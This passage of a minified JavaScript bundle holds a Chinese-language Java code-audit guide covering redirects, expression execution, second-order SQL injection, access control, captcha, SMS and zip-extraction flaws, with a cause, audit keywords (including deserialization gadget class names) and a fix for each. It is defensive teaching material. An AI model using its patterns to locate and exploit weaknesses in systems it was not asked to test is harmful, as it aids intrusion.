    3. \u9488\u5BF9\u4E0D\u540C\u7684\u529F\u80FD\uFF0C\u5C06\u53EF\u64CD\u4F5C\u6587\u4EF6\u8DEF\u5F84\u9650\u5236\u5728\u67D0\u4E2A\u76EE\u5F55\u5185\uFF0C\u7981\u6B62\u653B\u51FB\u8005\u901A\u8FC7 '../'\u7684\u65B9\u5F0F\u7A7F\u8D8A\u8DEF\u5F84\uFF0C\u5EFA\u8BAE\u4F7F\u7528getCanonicalPath()\u6807\u51C6\u5316\u8DEF\u5F84\uFF0C\u4E4B\u540E\u518D\u8FDB\u884C\u9650\u5236\u548C\u5224\u65AD\u3002
    4. \u4F7F\u7528 FilePermission \u9650\u5236\u6743\u9650\u3002

  `),Object(u.c)("URL\u91CD\u5B9A\u5411",`

\u6F0F\u6D1E\u6210\u56E0
    \u7531\u4E8EWeb\u7AD9\u70B9\u6709\u65F6\u9700\u8981\u6839\u636E\u4E0D\u540C\u7684\u903B\u8F91\u5C06\u7528\u6237\u5F15\u5411\u5230\u4E0D\u540C\u7684\u9875\u9762\uFF0C\u5982\u5178\u578B\u7684\u767B\u5F55\u63A5\u53E3\u5C31\u7ECF\u5E38\u9700\u8981\u5728\u8BA4\u8BC1\u6210\u529F\u4E4B\u540E\u5C06\u7528\u6237\u5F15\u5BFC\u5230\u767B\u5F55\u4E4B\u524D\u7684\u9875\u9762\uFF0C\u6574\u4E2A\u8FC7\u7A0B\u4E2D\u5982\u679C\u5B9E\u73B0\u4E0D\u597D\u5C31\u53EF\u80FD\u5BFC\u81F4URL\u91CD\u5B9A\u5411\u95EE\u9898\uFF0C\u653B\u51FB\u8005\u6784\u9020\u6076\u610F\u8DF3\u8F6C\u7684\u94FE\u63A5\uFF0C\u53EF\u4EE5\u5411\u7528\u6237\u53D1\u8D77\u9493\u9C7C\u653B\u51FB\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u51FA\u73B0URL\u91CD\u5B9A\u5411\u4E3B\u8981\u7684\u529F\u80FD\u6709\uFF1A
        \u7528\u6237\u767B\u5F55\u3001\u7EDF\u4E00\u8EAB\u4EFD\u8BA4\u8BC1\u5904\uFF0C\u8BA4\u8BC1\u5B8C\u4E86\u4F1A\u901A\u8FC7url=\u7684\u5F62\u5F0F\u8DF3\u8F6C\u5230\u7C7B\u4F3C\u64CD\u4F5C\u7684\u9875\u9762\u3002
        \u7528\u6237\u5206\u4EAB\u3001\u6536\u85CF\u5185\u5BB9\u540E\u8DF3\u8F6C\u3002
        \u8DE8\u57DF\u8BA4\u8BC1\u6388\u6743\u540E\u8FDB\u884C\u8DF3\u8F6C\u3002

    \u4E00\u4E9B\u76F8\u5173\u51FD\u6570\u53CA\u5173\u952E\u5B57\uFF1AsendRedirect\u3001setHeader\u3001forward\u3001redirect:\u3001<c:redirect\u3001self.location.href\u3001location.href\u3001windows.location.href\u7B49\u3002
    \u4E00\u4E9B\u5E38\u89C1\u7684\u53C2\u6570\u540D\u79F0\uFF1Aredirect\u3001redirect_do\u3001redirect_url\u3001url\u3001jump\u3001jump_to\u3001target\u3001to\u3001link\u3001domain\u7B49\u3002

    \u5BA1\u8BA1\u7684\u601D\u8DEF\u4E3A\u5B9A\u4F4D\u53EF\u80FD\u5B58\u5728redirect\u4E1A\u52A1\u7684\u4EE3\u7801\u6BB5\uFF0C\u5BA1\u8BA1\u8DF3\u8F6C\u7684URL\u662F\u5426\u6765\u81EA\u4E8E\u524D\u7AEF\u53C2\u6570\uFF0C\u662F\u5426\u5177\u6709\u6821\u9A8C\u548C\u9650\u5236\u3002

\u5982\u4F55\u4FEE\u590D

    1. \u5BF9\u4F20\u5165\u7684URL\u505A\u8BA4\u8BC1\u5904\u7406\uFF0C\u4FDD\u8BC1\u8BE5URL\u6765\u81EA\u4E8E\u4FE1\u4EFB\u57DF\u3002\u4F8B\u5982\u5982\u4E0B\u65B9\u5F0F\uFF1A
        \u901A\u8FC7\u9650\u5236Referer\u4FDD\u8BC1\u5C06\u8981\u8DF3\u8F6CURL\u7684\u6709\u6548\u6027\uFF0C\u907F\u514D\u653B\u51FB\u8005\u751F\u6210\u81EA\u5DF1\u7684\u6076\u610F\u8DF3\u8F6C\u94FE\u63A5\u3002
        \u52A0\u5165\u6709\u6548\u6027\u9A8C\u8BC1Token\uFF0C\u4FDD\u8BC1\u6240\u6709\u751F\u6210\u7684\u94FE\u63A5\u90FD\u6765\u81EA\u4E8E\u53EF\u4FE1\u57DF\uFF0C\u901A\u8FC7\u5728\u751F\u6210\u7684\u94FE\u63A5\u91CC\u52A0\u5165\u7528\u6237\u4E0D\u53EF\u63A7\u7684Token\u5BF9\u751F\u6210\u7684\u94FE\u63A5\u8FDB\u884C\u6821\u9A8C\u3002

    2. \u5173\u952E\u53C2\u6570\u524D\u7AEF\u4E0D\u53EF\u63A7\u3002
    3. \u5BF9\u8DF3\u8F6C\u7684URL\u8FDB\u884C\u767D\u540D\u5355\u68C0\u67E5

  `),Object(u.c)("\u654F\u611F\u4FE1\u606F\u6CC4\u9732",`

\u6F0F\u6D1E\u6210\u56E0
    \u5728\u5F00\u53D1\u4E2D\uFF0C\u53EF\u80FD\u4F7F\u7528\u5404\u79CD\u5404\u6837\u7684\u6846\u67B6\u3001\u7EC4\u4EF6\uFF0C\u7531\u4E8E\u914D\u7F6E\u4E0D\u5F53\u6216\u4F7F\u7528\u6709\u8BEF\uFF0C\u5C06\u53EF\u80FD\u5BFC\u81F4\u6CC4\u9732\u670D\u52A1\u5668\u7684\u654F\u611F\u4FE1\u606F\u3002
    \u4F8B\u5982\uFF1Aswagger \u63A5\u53E3\u6587\u6863\u3001Hystrix \u76D1\u63A7\u9762\u677F\u3001DWR \u6846\u67B6\u3001druid\u76D1\u63A7\u5E73\u53F0\u7B49\u7B49\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u91CD\u70B9\u5BA1\u8BA1\u7CFB\u7EDF\u4F7F\u7528\u7684\u6846\u67B6\u3001\u7EC4\u4EF6\uFF0C\u6839\u636E\u7ECF\u9A8C\u67E5\u770B\u914D\u7F6E\uFF0C\u914D\u7F6E\u662F\u5426\u6709\u8BEF\u3001\u662F\u5426\u5C06\u8C03\u8BD5\u529F\u80FD\u6B63\u5F0F\u4E0A\u7EBF\u5230\u751F\u4EA7\u73AF\u5883\u4E2D\u7B49\u3002

\u5982\u4F55\u4FEE\u590D
    \u5728\u4F7F\u7528\u654F\u611F\u529F\u80FD\uFF0C\u6216\u6846\u67B6\u3001\u7EC4\u4EF6\u63D0\u4F9B\u4E86\u7BA1\u7406\u9875\u9762\u3001\u8C03\u8BD5\u63A5\u53E3\u65F6\uFF0C\u4E3A\u6B64\u7C7B\u529F\u80FD\u8BBE\u7F6E\u8BBF\u95EE\u6743\u9650\u6821\u9A8C\u3002

  `),Object(u.c)("\u4EE3\u7801\u6267\u884C/\u8868\u8FBE\u5F0F\u6267\u884C",`

\u6F0F\u6D1E\u6210\u56E0
    \u5728Java\u4E2D\u7684\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u901A\u5E38\u4E0D\u5E38\u89C1\uFF0C\u56E0\u4E3A\u5728jdk9\u4E4B\u524D\u7684Java\u5E76\u4E0D\u63D0\u4F9Beval\u529F\u80FD\uFF0C\u60F3\u8981\u6267\u884C\u4EFB\u610F\u4EE3\u7801\uFF0C\u5C31\u8981\u52A8\u6001\u7F16\u8BD1\uFF0C\u6216\u4F7F\u7528\u53CD\u5E8F\u5217\u5316\u3001\u81EA\u5B9A\u4E49ClassLoader\u3001\u7ED3\u5408JNDI\u670D\u52A1\u3001SPI\u673A\u5236\u7B49\u529F\u80FD\u5B8C\u6210\u7684\u4EFB\u610F\u4EE3\u7801\u6267\u884C\u80FD\u529B\u3002\u8FD9\u79CD\u65B9\u5F0F\u4E00\u822C\u662F\u5B89\u5168\u7814\u7A76\u5458\u7814\u7A76\u7528\u4E8E\u533A\u522B\u4E8E\u4F20\u7EDF\u7684\u547D\u4EE4\u6267\u884Cwebshell\u7528\uFF0C\u5E73\u5E38\u5728\u5F00\u53D1\u65F6\u5F88\u5C11\u4F1A\u9047\u89C1\u6B64\u7C7B\u529F\u80FD\uFF0C\u53EF\u53C2\u8003\u8FD9\u91CC\u3002
    \u76F8\u6BD4\u4E4B\u4E0B\uFF0C\u66F4\u5E38\u89C1\u7684\u662F\u5404\u79CD\u8868\u8FBE\u5F0F\u7684\u6267\u884C\uFF0C\u5305\u62EC\u4F46\u4E0D\u9650\u4E8E SpEL\u3001OGNL\u3001MVEL2\u3001EL\u7B49\uFF0C\u5728\u4E0D\u540C\u7684\u73AF\u5883\u4E0B\u7A0B\u5E8F\u548C\u6846\u67B6\u53EF\u80FD\u4F7F\u7528\u4E86\u4E0D\u540C\u7684\u8868\u8FBE\u5F0F\u89E3\u6790/\u6A21\u677F\u5F15\u64CE\uFF0C\u5728\u4F7F\u7528\u548C\u914D\u7F6E\u6709\u8BEF\u7684\u60C5\u51B5\u4E0B\uFF0C\u5C06\u5BFC\u81F4\u4EFB\u610F\u8868\u8FBE\u5F0F\u6267\u884C\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u91CD\u70B9\u5BA1\u8BA1\u5177\u6709\u52A0\u8F7D\u7C7B\u3001\u53CD\u5E8F\u5217\u5316\u7C7B\u3001\u5BF9\u7C7B\u5B57\u8282\u7801\u8FDB\u884C\u64CD\u4F5C\u7684\u529F\u80FD\u548C\u4EE3\u7801\uFF0C\u5173\u952E\u5B57\u5982\u4E0B\uFF1A
        eval
        classLoader
        $$BCEL$$
        ServiceLoader
        ToolProvider.getSystemJavaCompiler()
        getSystemClassLoader
        JavaFileObject
        JdbcRowSetImpl
        TemplatesImpl
        TransformerFactoryImpl
        resolveClass
        loadClass
        javax.el.ELProcessor
        SpelExpressionParser
    \u540C\u65F6\u5173\u6CE8\u7A0B\u5E8F\u4E2D\u4F7F\u7528\u7684\u8868\u8FBE\u5F0F\u89E3\u6790\u7EC4\u4EF6\u548C\u6846\u67B6\u3002

\u5982\u4F55\u4FEE\u590D
    \u5728\u975E\u5FC5\u8981\u60C5\u51B5\u4E0B\uFF0C\u907F\u514D\u4E1A\u52A1\u4E2D\u51FA\u73B0\u6B64\u7C7B\u529F\u80FD\uFF0C\u6216\u5BF9\u6570\u636E\u6E90\u8FDB\u884C\u4E25\u683C\u6821\u9A8C\u3002


  `)),Object(u.a)(e||(e=Object(t.a)([`
  \u3010\u4E8C\u6B21\u6CE8\u5165\u3011

  \u4E8C\u6B21\u6CE8\u5165
      \u539F\u7406
              \u4E8C\u6B21\u6CE8\u5165\u53EF\u4EE5\u7406\u89E3\u4E3A\uFF0C\u653B\u51FB\u8005\u6784\u9020\u7684\u6076\u610F\u6570\u636E\u5B58\u50A8\u5728\u6570\u636E\u5E93\u540E\uFF0C\u6076\u610F\u6570\u636E\u88AB\u8BFB\u53D6\u5E76\u8FDB\u5165\u5230SQL\u67E5\u8BE2\u8BED\u53E5\u6240\u5BFC\u81F4\u7684\u6CE8\u5165\u3002
      \u6B65\u9AA4
              \u7B2C\u4E00\u6B65\u63D2\u5165\u6076\u610F\u6570\u636E\uFF0C\u5728\u63D2\u5165\u6570\u636E\u7684\u65F6\u5019\uFF0C\u5BF9\u5176\u4E2D\u7279\u6B8A\u5B57\u7B26\u8FDB\u884C\u4E86\u8F6C\u4E49\u5904\u7406\uFF0C\u5728\u5199\u5165\u6570\u636E\u5E93\u7684\u65F6\u5019\u53C8\u4FDD\u7559\u4E86\u539F\u6765\u7684\u6570\u636E
              \u7B2C\u4E8C\u6B65\u5F15\u7528\u6076\u610F\u6570\u636E\uFF0C\u7531\u4E8E\u5F00\u53D1\u8005\u9ED8\u8BA4\u5B58\u5165\u7684\u6570\u636E\u5E93\u7684\u6570\u636E\u90FD\u662F\u5B89\u5168\u7684\uFF0C\u5728\u67E5\u8BE2\u7684\u65F6\u5019\uFF0C\u53EF\u4EE5\u76F4\u63A5\u4ECE\u6570\u636E\u5E93\u4E2D\u83B7\u53D6\u6076\u610F\u7684\u6570\u636E\uFF0C\u6CA1\u6709\u8FDB\u884C\u68C0\u6D4B\uFF0C\u8FDB\u800C\u5BFC\u81F4\u4E8C\u6B21\u6CE8\u5165\u3002
      \u9632\u5FA1\u65B9\u5F0F
              \u4F7F\u7528\u9884\u5904\u7406\u548C\u6570\u636E\u7ED1\u5B9A\u7684\u65B9\u5F0F
                      PreparedStatements\u4E4B\u7C7B\u7684\u65B9\u6CD5\u3002
              \u5BF9\u6570\u636E\u7684\u6D41\u52A8\u8FDB\u884C\u68C0\u6D4B\uFF0C\u65E0\u8BBA\u662F\u6765\u81EA\u5BA2\u6237\u7AEF\u7684\u6570\u636E\u8FD8\u662F\u6765\u81EA\u6570\u636E\u5E93\u7684\u6570\u636E\uFF0C\u90FD\u8981\u5BF9\u5176\u8FDB\u884C\u300A\u8FC7\u6EE4\uFF0C\u8F6C\u4E49\u300B
                      PHP\uFF1A
                          \uFF08mysql_escape_string\uFF0Cmysql_real_escape_string\uFF09\u3002
                      Java\uFF1A
                          Apache\u7684\u300Acommons-lang\u300B\u5305\uFF0C\u63D0\u4F9B\u4E86  StringEscapeUtils  \u5DE5\u5177\u7C7B\u3002
                          \u53EF\u4EE5\u81EA\u5DF1\u5C01\u88C5\u4E00\u4E9B escape\u8F6C\u4E49 \u65B9\u6CD5\u3002
                          \u501F\u7528  \u4E00\u4E9BSqlFilter\u4E4B\u7C7B\u7684  \u8FC7\u6EE4\u5668\u3002


  `]))),Object(u.a)(a||(a=Object(t.a)([`
  \u3010\u6F0F\u6D1E\u3011\u3001
  \u3010\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u3011\u3001\u3010\u903B\u8F91\u6F0F\u6D1E\u3011

  \u3010\u8D8A\u6743\u6F0F\u6D1E\u3011\u3001\u3010\u6C34\u5E73\u8D8A\u6743\u6F0F\u6D1E\u3011\u3001\u3010\u5782\u76F4\u8D8A\u6743\u6F0F\u6D1E\u3011\u3001
  \u3010\u56FE\u5F62\u9A8C\u8BC1\u7801\u6F0F\u6D1E\u3011\u3001\u3010\u77ED\u4FE1\u670D\u52A1\u6F0F\u6D1E\u3011\u3001\u3010Zip\u6587\u4EF6\u63D0\u53D6\u3011\u3001

  \u3010\u81EA\u52A8\u7ED1\u5B9A\u6F0F\u6D1E\u3011\u3001\u3010MassAssignment\u3011\u3001\u3010AutoBinding\u3011\u3001\u3010ObjectInjection\u3011

  \u3010\u5176\u4ED6\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E\u3011\u3001\u3010\u6821\u9A8C\u4E0D\u5B8C\u5168\u3011\u3001\u3010\u6821\u9A8C\u987A\u5E8F\u9519\u8BEF\u3011\u3001\u3010\u6821\u9A8C\u903B\u8F91\u8BBE\u8BA1\u9519\u8BEF\u3011\u3001\u3010\u4EFB\u610F\u5BC6\u7801\u91CD\u7F6E\u3011\u3001
          \u3010\u9A8C\u8BC1\u7801\u7ED5\u8FC7\u3011\u3001\u3010\u767B\u5F55\u3011\u3001\u3010\u767B\u9646\u3011\u3001\u3010\u6CE8\u518C\u3011\u3001\u3010\u627E\u56DE\u5BC6\u7801\u3011\u3001\u3010\u91CD\u7F6E\u5BC6\u7801\u3011\u3001\u3010\u624B\u673A\u9A8C\u8BC1\u3011\u3001
          \u3010\u90AE\u7BB1\u9A8C\u8BC1\u3011\u3001\u3010\u5145\u503C\u3011\u3001\u3010\u4ED8\u6B3E\u3011\u3001\u3010\u654F\u611F\u4FE1\u606F\u67E5\u8BE2\u3011\u3001\u3010\u8EAB\u4EFD\u4FE1\u606F\u8BA4\u8BC1\u903B\u8F91\u95EE\u9898\u3011\u3001\u3010\u77ED\u4FE1\u8F70\u70B8\u3011\u3001
          \u3010\u90AE\u4EF6\u8F70\u70B8\u3011\u3001\u3010\u7535\u8BDD\u8F70\u70B8\u3011\u3001\u3010\u5F31\u52A0\u5BC6\u3011\u3001\u3010\u5F31\u53E3\u4EE4\u3011\u3001\u3010\u5F31\u5BC6\u7801\u3011\u3001\u3010\u5F31\u5BC6\u94A5\u3011


      \u8D8A\u6743\u6F0F\u6D1E`,`
      \u56FE\u5F62\u9A8C\u8BC1\u7801\u6F0F\u6D1E`,`
      \u77ED\u4FE1\u670D\u52A1\u6F0F\u6D1E`,`
      Zip\u6587\u4EF6\u63D0\u53D6`,`
      \u81EA\u52A8\u7ED1\u5B9A\u6F0F\u6D1E`,`

      \u5176\u4ED6\u4E1A\u52A1\u903B\u8F91\u6F0F\u6D1E`,`


  `])),Object(u.c)("\u8D8A\u6743\u6F0F\u6D1E________\u6C34\u5E73\u8D8A\u6743\u6F0F\u6D1E________\u5782\u76F4\u8D8A\u6743\u6F0F\u6D1E",`

\u6F0F\u6D1E\u6210\u56E0
    \u5728\u5E94\u7528\u7A0B\u5E8F\u5904\u7406\u5F53\u524D\u7528\u6237\u8BF7\u6C42\u65F6\uFF0C\u6CA1\u6709\u5BF9\u7528\u6237\u6743\u9650\u8FDB\u884C\u6821\u9A8C\uFF0C\u6216\u6821\u9A8C\u4E0D\u8DB3\u3001\u5931\u6548\uFF0C\u5BFC\u81F4\u4F4E\u6743\u9650\u7528\u6237\u4F7F\u7528\u9AD8\u6743\u9650\u529F\u80FD\uFF0C\u6216\u540C\u6743\u9650\u7528\u6237\u64CD\u4F5C\u5BF9\u65B9\u6570\u636E\u3002
    \u5BF9\u7528\u6237\u7684\u8EAB\u4EFD\u6807\u8BC6\u4FE1\u606F\u4ECE\u53EF\u4F2A\u9020\u7684\u53C2\u6570\u6216headers\u4E2D\u83B7\u53D6\uFF0C\u800C\u4E0D\u662F\u4ECEsession\u4E2D\u83B7\u53D6\u7684\u8BDD\uFF0C\u53EF\u80FD\u5B58\u5728\u8D8A\u6743\u3002
    \u4E00\u4E9B\u8DE8\u57DF\u7684\u670D\u52A1\u5BFC\u5411\u67B6\u6784\uFF0C\u5C24\u5176\u662F\u4E00\u4E9B\u6570\u636E\u5904\u7406\u7684\u63A5\u53E3\uFF0C\u5982\u679C\u7F3A\u5C11\u7C7B\u4F3Ctoken\u7684\u8BA4\u8BC1\u673A\u5236\u7684\u8BDD\uFF0C\u4E5F\u4F1A\u5B58\u5728\u7C7B\u4F3C\u7684\u8D8A\u6743\u8BBF\u95EE\u95EE\u9898\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u9488\u5BF9\u7CFB\u7EDF\u4EFB\u610F\u529F\u80FD\u90FD\u53EF\u80FD\u5B58\u5728\u8D8A\u6743\uFF0C\u5BA1\u8BA1\u5173\u6CE8\u7684\u662F:
        \u64CD\u4F5C\u662F\u5426\u9700\u8981\u8EAB\u4EFD\u6807\u8BC6\u6216\u5176\u4ED6\u6807\u8BC6\u3002
        \u6B64\u6807\u8BC6\u662F\u5426\u7531\u7528\u6237\u53EF\u63A7\u3002
        \u662F\u5426\u80FD\u591F\u53EF\u731C\u89E3\uFF0C\u4E0D\u540C\u4E3B\u4F53\u7684\u6807\u8BC6\u662F\u5426\u5177\u6709\u89C4\u5F8B\u6027\u3002
        \u67E5\u8BE2\u4FE1\u606F\u573A\u666F\u4E0B\uFF0C\u4FE1\u606F\u662F\u5426\u4E0E\u8EAB\u4EFD\u6807\u8BC6\u8FDB\u884C\u7ED1\u5B9A\u3002
        \u5BF9\u5E94\u5904\u7406\u7684\u51FD\u6570\u65B9\u6CD5\u4E2D\u662F\u5426\u4F7F\u7528\u6CE8\u89E3\u6216\u5176\u4ED6\u65B9\u5F0F\u5BF9\u5F53\u524D\u7528\u6237\u8FDB\u884C\u6743\u9650\u6821\u9A8C\u3002
        \u6821\u9A8C\u80FD\u5426\u88AB\u7ED5\u8FC7\u6216\u5931\u6548\u3002

\u5982\u4F55\u4FEE\u590D
    \u5904\u7406\u8BF7\u6C42\u4E4B\u524D\u5148\u8FDB\u884C\u6743\u9650\u6821\u9A8C\uFF0C\u53EF\u901A\u8FC7Filter\u3001AOP\u6216\u62E6\u622A\u5668\u8FDB\u884C\u5B9E\u73B0\u3002
    \u7528\u6237\u6807\u8BC6\u4ECE\u7F13\u5B58\u4E2D\u53D6\u51FA\uFF0C\u5C3D\u91CF\u4E0D\u4ECE\u53C2\u6570\u4E2D\u53D6\u3002

  `),Object(u.c)("\u56FE\u5F62\u9A8C\u8BC1\u7801\u6F0F\u6D1E",`

\u6F0F\u6D1E\u6210\u56E0
    \u5F53\u9A8C\u8BC1\u7801\u56FE\u7247\u7684\u957F\u5BBD\u7531\u524D\u7AEF\u53C2\u6570\u63A7\u5236\uFF0C\u5E76\u4E14\u540E\u7AEF\u6CA1\u6709\u8FDB\u884C\u6821\u9A8C\u65F6\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u5E76\u53D1\u751F\u6210\u8D85\u5927\u7684\u56FE\u7247\u6765\u8FDB\u884CDDOS\u653B\u51FB\u3002
    \u5F53\u9A8C\u8BC1\u7801\u8BA4\u8BC1\u4E86\u4E00\u6B21\u540E\uFF0C\u65E0\u8BBA\u6210\u529F\u8FD8\u662F\u5931\u8D25\uFF0C\u6CA1\u6709\u53CA\u65F6\u6E05\u7A7A\uFF0C\u5C31\u53EF\u4EE5\u88AB\u91CD\u590D\u4F7F\u7528\uFF0C\u5BFC\u81F4\u7206\u7834\u653B\u51FB\u3002
    \u7B80\u5355\u7684\u56FE\u7247\u9A8C\u8BC1\u7801\u53EF\u88ABOCR\u8BC6\u522B\uFF0C\u5BFC\u81F4\u7206\u7834\u653B\u51FB\u3002
    \u5728\u540E\u7AEF\u903B\u8F91\u6821\u9A8C\u8FC7\u7A0B\u4E2D\u5E76\u672A\u5BF9\u524D\u7AEF\u4F20\u9012\u9A8C\u8BC1\u7801\u53C2\u6570\u4E3Anull\u8FDB\u884C\u76F8\u5173\u7684\u903B\u8F91\u5224\u65AD\uFF0C\u76F4\u63A5\u5220\u9664\u9A8C\u8BC1\u7801\u53C2\u6570\u6216\u7F6E\u7A7A\u503C\u5373\u53EF\u7ED5\u8FC7\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u5728\u767B\u9646\uFF0C\u91CD\u8981\u6570\u636E\u7684\u589E\u5220\u6539\u529F\u80FD\u5904\u4E00\u822C\u4F1A\u6DFB\u52A0\u56FE\u5F62\u9A8C\u8BC1\u7801\u529F\u80FD\uFF0C\u53EF\u4EE5\u901A\u5173\u5173\u952E\u5B57\u641C\u7D22\uFF1Acaptcha\u3001checkCode\u7B49\u7B49\u3002
    \u91CD\u70B9\u5BA1\u8BA1\u9A8C\u8BC1\u7801\u751F\u6210\u903B\u8F91\uFF0C\u4EE5\u53CA\u9A8C\u8BC1\u7801\u7684\u5224\u65AD\u6821\u9A8C\u903B\u8F91\u3001\u987A\u5E8F\u3002

\u5982\u4F55\u4FEE\u590D
    \u56FE\u5F62\u9A8C\u8BC1\u7801\u7531\u540E\u7AEF\u63A7\u5236\u5927\u5C0F\uFF1B\u9A8C\u8BC1\u4E00\u6B21\u540E\u65E0\u8BBA\u662F\u5426\u6210\u529F\u90FD\u7ACB\u5373\u6E05\u7A7A\u7F13\u5B58\uFF1B\u751F\u6210\u590D\u6742\u7684\u56FE\u5F62\u9A8C\u8BC1\u7801\uFF0C\u964D\u4F4E\u906D\u5230\u673A\u5668\u8BC6\u522B\u7684\u98CE\u9669\uFF1B\u5BF9\u9A8C\u8BC1\u7801\u53C2\u6570\u662F\u5426\u4E3A\u7A7A\u8FDB\u884C\u5224\u65AD\u3002

  `),Object(u.c)("\u77ED\u4FE1\u670D\u52A1\u6F0F\u6D1E",`

\u6F0F\u6D1E\u6210\u56E0
    \u5982\u679C\u5E94\u7528\u7A0B\u5E8F\u5BF9\u77ED\u4FE1\u63A5\u53E3\u6CA1\u6709\u53D1\u9001\u9891\u7387\u9650\u5236\u3001\u6216\u6821\u9A8C\u903B\u8F91\u6709\u8BEF\uFF0C\u5219\u4F1A\u5BFC\u81F4\u77ED\u4FE1\u70B8\u5F39\u6F0F\u6D1E\u3002
    \u5982\u679C\u5BF9\u624B\u673A\u53F7\u8FDB\u884C\u6821\u9A8C\u6216\u683C\u5F0F\u5316\u5904\u7406\u903B\u8F91\u6709\u8BEF\uFF0C\u53EF\u5BFC\u81F4\u653B\u51FB\u8005\u901A\u8FC7\u4F7F\u7528\u7A7A\u683C\u3001\u5206\u9694\u7B26\u3001\u624B\u673A\u533A\u53F7\u3001\u5B57\u6BCD\u7B49\u65B9\u5F0F\u7ED5\u8FC7\u5BF9\u624B\u673A\u53F7\u7684\u9650\u5236\uFF0C\u5728\u8FDB\u884C\u7F13\u5B58\u8BA1\u6570\u65F6\u8FDB\u884C\u7ED5\u8FC7\u3002
    \u5982\u679C\u77ED\u4FE1\u5185\u5BB9\u7684\u63D0\u793A\u6709\u90E8\u5206\u901A\u8FC7\u53C2\u6570\u5185\u5BB9\u83B7\u53D6\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F4\u653B\u51FB\u8005\u7BE1\u6539\u6D88\u606F\u5185\u5BB9\uFF0C\u5BF9\u90E8\u5206\u7528\u6237\u8FDB\u884C\u5B9A\u70B9\u9493\u9C7C\u653B\u51FB\u3001\u6216\u5783\u573E\u77ED\u4FE1\u7B49\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u91CD\u70B9\u5BA1\u8BA1\u53D1\u9001\u77ED\u4FE1\u9A8C\u8BC1\u7801\u529F\u80FD\u7684\u4E1A\u52A1\u903B\u8F91\uFF0C\u4E00\u822C\u901A\u8FC7\u5173\u952E\u5B57sms\u8FDB\u884C\u641C\u7D22\u3002\u5BA1\u8BA1\u4E1A\u52A1\u903B\u8F91\u3001\u7F13\u5B58\u6B21\u6570\u903B\u8F91\u3001\u975E\u7A7A\u5224\u65AD\u903B\u8F91\u3001\u77ED\u4FE1\u5185\u5BB9\u903B\u8F91\u7B49\u7B49\u3002

\u5982\u4F55\u4FEE\u590D
    \u9488\u5BF9\u624B\u673A\u53F7\u7684\u683C\u5F0F\u5316\u4EE5\u53CA\u53F7\u7801\u7F13\u5B58\u7684\u4E1A\u52A1\u903B\u8F91\u8BBE\u8BA1\u4E00\u5B9A\u8981\u6B63\u786E\uFF0C\u5BF9\u77ED\u4FE1\u53D1\u9001\u63A5\u53E3\u53CA\u9A8C\u8BC1\u63A5\u53E3\u7684\u4E1A\u52A1\u987A\u5E8F\u8981\u6B63\u786E\u3002

  `),Object(u.c)("Zip\u6587\u4EF6\u63D0\u53D6",`

\u6F0F\u6D1E\u6210\u56E0
    \u5728\u4E1A\u52A1\u4E2D\u53EF\u80FD\u5B58\u5728\u4E0A\u4F20\u538B\u7F29\u6587\u4EF6\u5E76\u63D0\u53D6\u7684\u529F\u80FD\uFF0C\u5229\u7528\u6B64\u7C7B\u529F\u80FD\u53EF\u80FD\u5B58\u5728\u5982\u4E0B\u5B89\u5168\u95EE\u9898\uFF1A
        1. \u5982\u679C\u63D0\u53D6\u51FA\u7684\u6587\u4EF6\u6807\u51C6\u8DEF\u5F84\u843D\u5728\u89E3\u538B\u7684\u76EE\u6807\u76EE\u5F55\u4E4B\u5916\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u6B64\u529F\u80FD\u8FDB\u884C\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u3002
        2. \u63D0\u53D6\u51FA\u7684\u6587\u4EF6\u6D88\u8017\u8FC7\u591A\u7684\u7CFB\u7EDF\u8D44\u6E90\u3002zip\u7B97\u6CD5\u7684\u672C\u6027\u5C31\u53EF\u80FD\u4F1A\u5BFC\u81F4zip\u70B8\u5F39\uFF08zip bomb\uFF09\u7684\u51FA\u73B0\uFF0C\u7531\u4E8E\u6781\u9AD8\u7684\u538B\u7F29\u7387\uFF0C\u5373\u4F7F\u5728\u89E3\u538B\u5C0F\u6587\u4EF6\u65F6\uFF0C\u6BD4\u5982ZIP\u3001GIF\uFF0C\u4EE5\u53CAgzip\u7F16\u7801\u7684HTTP\u5185\u5BB9\uFF0C\u4E5F\u53EF\u80FD\u4F1A\u5BFC\u81F4\u8FC7\u5EA6\u7684\u8D44\u6E90\u6D88\u8017\u3002

\u5BA1\u8BA1\u7B56\u7565
    \u5BA1\u8BA1\u91CD\u70B9\u4E3B\u8981\u5173\u6CE8\u5E94\u7528\u662F\u5426\u5B58\u5728ZIP\u89E3\u538B\u7F29\u529F\u80FD\uFF1A
        FileInputStream
        ZipInputStream
        getSize()
        ZipEntry
    \u5982\u679C\u51FA\u73B0getSize\u57FA\u672C\u4E0A\u5C31\u9700\u8981\u7279\u522B\u6CE8\u610F\u4E86\u3002

\u5982\u4F55\u4FEE\u590D
    \u9488\u5BF9ZIP\u89E3\u538B\u7F29\u529F\u80FD\uFF0C\u5E94\u8BE5\u5728\u89E3\u538B\u6BCF\u4E2A\u6761\u76EE\u4E4B\u524D\u5BF9\u5176\u6587\u4EF6\u540D\u8FDB\u884C\u6821\u9A8C\u3002\u5982\u679C\u6821\u9A8C\u4E0D\u901A\u8FC7\uFF0C\u5C31\u7EC8\u6B62\u6574\u4E2A\u89E3\u538B\u8FC7\u7A0B\uFF0C\u6216\u5BF9\u5176\u8FDB\u884C\u5FFD\u7565\u3002
    \u9664\u4E86\u6821\u9A8C\u6587\u4EF6\u540D\uFF0C\u8FD8\u5E94\u8BE5\u5BF9\u6BCF\u4E2A\u6587\u4EF6\u5927\u5C0F\u8FDB\u884C\u9650\u5236\uFF0C\u8FC7\u5927\u7684\u5355\u4E2A\u6587\u4EF6\u5E94\u8BE5\u4E0D\u4E88\u5904\u7406\uFF0C\u6216\u629B\u51FA\u5F02\u5E38\u3002
